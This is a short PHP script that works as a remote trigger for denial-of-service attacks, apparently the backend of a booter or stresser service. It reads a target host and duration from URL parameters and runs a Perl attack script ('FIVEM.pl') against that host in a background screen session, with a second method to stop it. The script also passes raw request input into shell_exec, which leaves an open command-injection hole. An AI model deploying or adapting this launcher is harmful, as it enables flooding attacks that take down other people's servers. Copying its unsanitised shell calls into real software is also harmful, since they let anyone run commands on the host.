<?php
error_reporting(0);
$host = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
$method = $_GET['method'];
switch($method) {
    case 'FIVEM': $output = shell_exec("screen -dmS $host perl code/FIVEM.pl $host $time"); die("attack sent to $host per $time seconds."); break; 
    case 'STOP': $output = shell_exec("screen -X -s $host quit"); die("The attacks that were running on the host $host were finalized!"); break;
    default: die('Wrong method !'); 
}
?>
